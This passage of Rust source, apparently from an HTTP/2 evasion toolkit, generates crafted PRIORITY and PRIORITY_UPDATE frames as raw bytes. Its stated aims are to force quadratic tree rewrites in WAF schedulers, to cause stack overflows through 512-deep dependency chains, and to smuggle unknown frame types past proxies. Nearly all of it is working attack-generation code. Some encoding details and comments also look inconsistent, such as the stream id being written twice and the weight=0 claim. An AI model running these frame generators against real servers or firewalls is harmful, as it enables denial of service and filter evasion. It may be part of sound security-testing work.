    // 16 exclusive PRIORITY frames → 16 tree rewrites per pass.
    // Every second frame is weight=0 (implementation-defined, often
    // treated as weight=1 or rejected — both behaviours are interesting).
    for i in 0u32..16 {
        let stream_id = 2 * i + 1; // odd client-initiated
        frames.push(H2PriorityFrame {
            stream_id,
            exclusive: true,
            depends_on: 0, // root
            weight: if i % 2 == 0 { 0 } else { 255 },
            description: format!(
                "exclusive claim on root, weight={}, storm frame {}/16",
                if i % 2 == 0 { 0 } else { 255 },
                i + 1
            ),
        });
    }
    SpcaTopology {
        name: "SPCA Exclusive Weight Storm",
        description: "16 exclusive PRIORITY frames targeting root — forces O(n²) tree rewrites \
                       in WAF schedulers; alternating weight=0 tests implementation-defined behaviour",
        frames,
        target_flaw: H2TargetFlaw::FlowControl,
    }
}

/// Build a priority dependency tree with `depth` levels.
///
/// Very deep trees expose WAF parsers that recurse without a depth cap.
/// RFC 7540 does not specify a maximum dependency depth.
#[must_use]
pub fn spca_deep_dependency_chain(depth: usize) -> SpcaTopology {
    let depth = depth.clamp(1, 512); // cap at 512 to stay sane on the wire
    let mut frames: Vec<H2PriorityFrame> = Vec::with_capacity(depth);
    let mut parent: u32 = 0;
    for i in 0..depth {
        let stream_id = (2 * i + 1) as u32;
        frames.push(H2PriorityFrame {
            stream_id,
            exclusive: false,
            depends_on: parent,
            weight: 16,
            description: format!("stream {stream_id} → parent {parent}, depth {}", i + 1),
        });
        parent = stream_id;
    }
    SpcaTopology {
        name: "SPCA Deep Dependency Chain",
        description: "Linear dependency chain at maximum depth — triggers stack overflows \
                       in recursive WAF priority walkers",
        frames,
        target_flaw: H2TargetFlaw::FlowControl,
    }
}

/// PRIORITY_UPDATE frame (RFC 9218) smuggled over HTTP/2.
///
/// HTTP/2 does not define PRIORITY_UPDATE (that's HTTP/3), but some
/// proxies that speak both may pass unknown frame types through.
/// Returns the raw bytes of a synthetic PRIORITY_UPDATE frame.
/// Frame type = 0x10 (IETF provisional), flags = 0x00.
#[must_use]
pub fn spca_priority_update_frame(stream_id: u32, urgency: u8, incremental: bool) -> Vec<u8> {
    // PRIORITY_UPDATE payload: "u=<urgency>,i" / "u=<urgency>"
    let payload = if incremental {
        format!("u={urgency},i")
    } else {
        format!("u={urgency}")
    };
    let payload_bytes = payload.as_bytes();
    let length = payload_bytes.len() as u32 + 4; // +4 for the stream-id field
    let mut frame = Vec::with_capacity(9 + length as usize);
    // 3-byte length
    frame.push((length >> 16) as u8);
    frame.push((length >> 8) as u8);
    frame.push(length as u8);
    // type = 0x10 (PRIORITY_UPDATE provisional)
    frame.push(0x10);
    // flags = 0
    frame.push(0x00);
    // 4-byte stream id (the stream being prioritized)
    let sid = stream_id & 0x7FFF_FFFF;
    frame.push((sid >> 24) as u8);
    frame.push((sid >> 16) as u8);
    frame.push((sid >> 8) as u8);
    frame.push(sid as u8);
    // prioritized stream id (4 bytes, the header field)
    frame.push((sid >> 24) as u8);
    frame.push((sid >> 16) as u8);
    frame.push((sid >> 8) as u8);
    frame.push(sid as u8);
    frame.extend_from_slice(payload_bytes);
    frame
}

/// Serialize an H2PriorityFrame to its wire representation.
///
/// PRIORITY frame format (RFC 7540 §6.3):
/// - 3 bytes length = 5
/// - 1 byte type = 0x02
/// - 1 byte flags = 0x00
/// - 4 bytes stream id
/// - 1 bit exclusive + 31 bits dependency stream id
/// - 1 byte weight (0–255, actual weight = value + 1)
#[must_use]
pub fn priority_frame_to_bytes(f: &H2PriorityFrame) -> Vec<u8> {
    let mut out = Vec::with_capacity(14);
    // Length = 5
    out.extend_from_slice(&[0x00, 0x00, 0x05]);
    // Type = PRIORITY (0x02)
    out.push(0x02);
    // Flags = 0x00
    out.push(0x00);
    // Stream ID (31 bits, MSB reserved)
    let sid = f.stream_id & 0x7FFF_FFFF;
    out.push((sid >> 24) as u8);
    out.push((sid >> 16) as u8);
    out.push((sid >> 8) as u8);
    out.push(sid as u8);
    // Exclusive flag (1 bit) + dependency stream id (31 bits)
    let dep = f.depends_on & 0x7FFF_FFFF;
    let exclusive_bit: u32 = if f.exclusive { 0x8000_0000 } else { 0 };
    let dep_field = exclusive_bit | dep;
    out.push((dep_field >> 24) as u8);
    out.push((dep_field >> 16) as u8);
    out.push((dep_field >> 8) as u8);
    out.push(dep_field as u8);
    // Weight
    out.push(f.weight);
    out
}

#[cfg(test)]
#[path = "h2_evasion_tests.rs"]
mod tests;
